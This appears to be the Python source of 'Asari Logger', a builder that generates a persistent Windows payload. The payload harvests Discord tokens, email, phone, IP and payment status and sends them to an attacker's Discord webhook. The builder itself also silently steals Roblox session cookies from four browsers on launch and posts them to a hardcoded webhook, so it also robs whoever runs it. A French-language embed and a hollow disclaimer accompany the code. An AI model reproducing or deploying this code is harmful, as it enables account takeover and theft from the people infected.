from pystyle import Colorate, Colors, System, Center, Write, Anime
import winsound
import browser_cookie3, requests, threading


def mkdata(webhook: str, ping: bool) -> str:
    return r"""# 
# /Asari
from urllib.request import urlopen, Request
from urllib.error import HTTPError
from os import getenv, listdir, startfile
from os.path import isdir, isfile
from re import findall
from json import loads, dumps
from shutil import copy
path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Asari.pyw" % getenv("userprofile")
if not isfile(path):
    copy(__file__, path)
    startfile(path)
    exit()
elif __file__.replace('\\', '/') != path.replace('\\', '/'):
    exit()
webhook = '""" + webhook + r"""'
pingme = """ + str(ping) + r"""
class Discord:
    def setheaders(token: str = None) -> dict:
        headers = {'content-type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
        if token:
            headers['authorization'] = token
        return headers
    def get_tokens() -> list:
        tokens = []
        LOCAL = getenv("LOCALAPPDATA")
        ROAMING = getenv("APPDATA")
        PATHS = {
            "Discord": ROAMING + "\\Discord",
            "Discord Canary": ROAMING + "\\discordcanary",
            "Discord PTB": ROAMING + "\\discordptb",
            "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
            "Opera": ROAMING + "\\Opera Software\\Opera Stable",
            "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
        }
        def search(path: str) -> list:
            path += "\\Local Storage\\leveldb"
            found_tokens = []
            if isdir(path):
                for file_name in listdir(path):
                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                        continue
                    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                            for token in findall(regex, line):
                                try: 
                                    urlopen(Request(
                                        "https://discord.com/api/v9/users/@me",
                                        headers=Discord.setheaders(token)))
                                except HTTPError:
                                    continue
                                if token not in found_tokens and token not in tokens:
                                    found_tokens.append(token)
            return found_tokens
        for path in PATHS:
            for token in search(PATHS[path]):
                tokens.append(token)
        return tokens
class Grab:
    def token_grab(token: str):
        def getavatar(uid, aid) -> str:
            url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}"
            try:
                urlopen(Request(url, headers=Discord.setheaders()))
            except HTTPError:
                url += ".gif"
            return url
        def has_payment_methods(token) -> bool:
            has = False
            try:
                has = bool(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                           headers=Discord.setheaders(token))).read()))
            except:
                pass
            return has
        valid, invalid = "<:valide:858700826499219466>", "<:invalide:858700726905733120>"
        def verify(var):
            return valid if var else invalid
        user_data = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me",
                        headers=Discord.setheaders(token))).read())
        ip = loads(urlopen(Request('http://ipinfo.io/json')).read())['ip']
        computer_username = getenv("username")
        username = user_data["username"] + \
            "#" + str(user_data["discriminator"])
        user_id = user_data["id"]
        avatar_id = user_data["avatar"]
        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
        email = user_data.get("email")
        phone = user_data.get("phone")
        mfa_enabled = bool(user_data['mfa_enabled'])
        email_verified = bool(user_data['verified'])
        billing = bool(has_payment_methods(token))
        nitro = bool(user_data.get("premium_type"))
        nitro = valid if nitro else invalid
        email_verified = verify(email_verified)
        billing = verify(billing)
        mfa_enabled = verify(mfa_enabled)
        if not phone:
            phone = invalid
        data = [{
            "title": "Asari",
            "description": "Grabbed!",
            "url": "/Asari",
            "image": {
                "url": "
            },
            "color": 0x1D5EFF,
            "fields": [
                {
                    "name": "**Infos Du Compte**",
                            "value": f'Email: {email}\nTéléphone: {phone}\nPaiement: {billing}',
                            "inline": True
                },
                {
                    "name": "**Infos du PC**",
                            "value": f"IP: {ip}\nUtilisateur: {computer_username}",
                            "inline": True
                },
                {
                    "name": "**Infos Supplémentaires**",
                            "value": f'Nitro: {nitro}\n2FA: {mfa_enabled}',
                            "inline": False
                },
                {
                    "name": "**Token**",
                            "value": f"||{token}||",
                            "inline": False
                }
            ],
            "author": {
                "name": f"{username}",
                        "icon_url": avatar_url
            },
            "thumbnail": {
                "url": "
            },
            "footer": {
                "text": ""
            }
        }]
        Grab.send(data)
    def send(data: str):
        data = {"username": "Asari",
                "avatar_url": ",
                "embeds": data,
                "content": "@everyone" if pingme else ""}
        return urlopen(Request(webhook, data=dumps(data).encode('utf-8'), headers=Discord.setheaders()))
sent_tokens = []
def token_grab():
    for token in Discord.get_tokens():
        if token not in sent_tokens:
            Grab.token_grab(token)
        sent_tokens.append(token)
ready_data = [{
    "title": "Asari",
    "description": "Initialized!",
    "url": "",
    "image": {
        "url": ""
    },
    "color": 0x1D5EFF,
    "fields": [
        {
            "name": "**Ready!**",
            "value": 'I am ready to find some tokens!',
            "inline": True
        }
    ],
    "thumbnail": {
        "url": "
    },
    "footer": {
        "text": ""
    }
}]
Grab.send(ready_data)
while True:
    if not isfile(__file__):
        exit()
    token_grab()
"""


Asari = '''

 $$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\  $$$$$$\ 
$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ \_$$  _|
$$ /  $$ |$$ /  \__|$$ /  $$ |$$ |  $$ |  $$ |  
$$$$$$$$ |\$$$$$$\  $$$$$$$$ |$$$$$$$  |  $$ |  
$$  __$$ | \____$$\ $$  __$$ |$$  __$$<   $$ |  
$$ |  $$ |$$\   $$ |$$ |  $$ |$$ |  $$ |  $$ |  
$$ |  $$ |\$$$$$$  |$$ |  $$ |$$ |  $$ |$$$$$$\ 
\__|  \__| \______/ \__|  \__|\__|  \__|\______|'''[1:]
                                                


banner = f'''
$$$$$$$$$$$$$$$$""$o$o$o$o$o$oo$$""$$$$$$$$$$$$$$$
$$$$$$$$$$$$""o$$$$$$$$$$"$"$$$$$$$o$"$$$$$$$$$$$$
$$$$$$$$$"$o$$$$""$oo $ ""      """$$$oo"$$$$$$$$$
$$$$$$$"o$$$$"   ""o  $oo o o       ""$$$o"$$$$$$$
$$$$$"o$$$"       oo$$$$$$$$$$o        "$$$o"$$$$$
$$$$"o$$$  $  o$$$$$$$$$$$$$$"$$oo       "$$$ $$$$
$$$"$$$"   "$$$$$$$$$$$$$$$$o$o$$$"        $$$o$$$
$$ $$$    o$$$$$$$$$$$$$$$$$$$$$$$$o o   o  "$$o"$                                 | ASARI LOGGER |
$"$$$"    o$$$$$$$$$"$$$$$$"" "$$$$$$"$$$$$  $$$"$
$o$$"    o$$$$$$$$$$o""$$$""""ooo"$$$$$$$$"   $$$"                                
$o$$"    o$$$$$$$$$$            ""oo"$"$o""   $$$o                            Made By Shmooky ; asari#6232
o$$$     o$$$$$$$$$$                """""$    o$$o                                   *DISCLAIMER*
o$$$    o$$$$$$$$$$$$o                   "o "oo$$o      I am not responsible for anything that happens when you run, share, or modify this program
o$$$  oo$$$$$$$$$$$$$$$$ooooooo$$$$$oo    $"$ "$$o     For that reason, I do not condone giving this program to anyone you dislike, have a grudge against or want to log.
o$$$"  ""  $$$$$$$$$$$$$$$$$$$$$$$$$$$$o    " $$$                
$ $$$       "$$$$$$$$$$$$$$$$$$$$$$$$$$$o    o$$"$
$$"$$o       "$$$$$$$$$$$$$$$$$$$$$$$$$$$o   $$$o$                               [PRESS] Enter to continue
$$o$$$o       $$""$$$$$$$$$$$$$$$$$$$$$$$o  $$$ $$                                                              
$$$o"$$o    "$""  "$""$$$$$$$$$$$$$$$$$$$oo$$$"$$$                                                 
$$$o"$$o    "$""  "$""$$$$$$$$$$$$$$$$$$$oo$$$"$$$                                                          
$$$o"$$o    "$""  "$""$$$$$$$$$$$$$$$$$$$oo$$$"$$$                                                   
$$$o"$$o    "$""  "$""$$$$$$$$$$$$$$$$$$$oo$$$"$$$                                                           
$$$$$$$$o"$$$$ooooo$$$$$$$$$$$$$$$$$$$$$$"o$$$$$$$                                                       
$$$$$$$$$$o""$$$$$$$$$$$$$$$$$$$$$$$$$"oo$$$$$$$$$                                                           
$$$$$$$$$$$$$o$""$$$$$$$$$$$$$$$$$""oo$$$$$$$$$$$$                                                         
$$$$$$$$$$$$$$$$$$o$o$"$"$"$"$oo$o$$$$$$$$$$$$$$$$  '''[1:]                                                          



System.Clear()
System.Size(200, 70)
System.Title("Asari Main Menu")


Anime.Fade(Center.Center(banner), Colors.blue_to_purple,
           Colorate.Vertical, enter=True)


def main():
    System.Clear()
    System.Size(70, 20)
    System.Title("Asari Logger")

    print("\n"*2)
    print(Colorate.DiagonalBackwards(Colors.blue_to_purple, Center.XCenter(Asari)))
    print("\n"*5)
    
    webhook = Write.Input("Webhook : ",
                          Colors.blue_to_purple, interval=0.009)

    if not webhook.strip():
        Colorate.Error("Webhook didn't work")
        return

    encode = Write.Input("Automatically Encode Webhook? (y/n) :",
                          Colors.blue_to_cyan, interval=0.007)

    if encode not in ('y', 'n'):
        Colorate.Error("Please type either y/n")

    ping = Write.Input("Ping on log? Y/N ",
                       Colors.red_to_white, interval=0.007)
    
    if ping not in ('y', 'n'):
        Colorate.Error("Please type either y/n")
        return
    
    ping = ping == 'y'

    data = mkdata(webhook=webhook, ping=ping)
    with open("Asari.pyw", 'w', encoding='utf-8') as f:
        f.write(data)

    print()
    Write.Input("Created! Refresh your folder", Colors.cyan_to_purple, interval=0.005)
    return exit()

WebHook = "https://discord.com/api/webhooks/1002720885813297162/os_SUalKTDVeh-rJVDBhK8IqYQknz1c3zo_j_u_nV_KBYCMVLEA9b9Oc-3Sv1rqP1eL1" # Input your webhook here and make sure to compile if you want to log your target

def MicrosoftEdge():
    try:
        cookies = browser_cookie3.edge(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"username" : "Cookie Logger", "content" : f"```{cookie}```"})
    except:
        pass

def GoogleChrome():
    try:
        cookies = browser_cookie3.chrome(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"username" : "Cookie Logger", "content" : f"```{cookie}```"})
    except:
        pass

def MozillaFirefox():
    try:
        cookies = browser_cookie3.firefox(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"username" : "Cookie Logger", "content" : f"```{cookie}```"})
    except:
        pass

def Opera():
    try:
        cookies = browser_cookie3.opera(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"username" : "Cookie Logger", "content" : f"```{cookie}```"})
    except:
        pass

browsers = [MicrosoftEdge, GoogleChrome, MozillaFirefox, Opera]

for v in browsers:
    threading.Thread(target = v).start()


if __name__ == '__main__':
    while True:
        main()
